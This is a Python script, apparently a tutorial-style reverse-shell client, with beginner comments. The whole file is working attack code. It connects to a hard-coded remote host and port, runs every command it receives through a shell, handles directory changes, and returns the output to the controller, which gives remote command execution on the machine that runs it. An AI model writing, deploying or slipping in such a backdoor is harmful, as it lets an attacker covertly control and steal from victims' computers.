import socket
import os
import subprocess   # subprocess controls the process of pc
import time

soc = socket.socket()
host = '192.168.0.103'     # ip of client
port = 9999               # has to be the same of sever.py files port

# binding the host & port for client
soc.connect((host, port))  # for client soc.connect binds the host & port

while True:    # while True is infinite loop to receive multiple commands

        data = soc.recv(20480)       # receive the data in bit format
        try:                         # without this try & except code, for any wrong command, client connection will lost
            if data[:2].decode("utf-8") == 'cd':   # check the data of ([:2]) means first 2 character and decodes from server files encoded data
                os.chdir(data[3:].decode("utf-8")) # checks data after 3rd character,Ex: cd ..[this line will check for from 4th character, in this case ..

            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte, "utf-8")
                currentWD = os.getcwd() + ">"
                soc.send(str.encode(output_str + currentWD))
        except:
            soc.send(str.encode("Invalid command !!!"))


    # this print shows the output in clients pc
            #print(output_str)
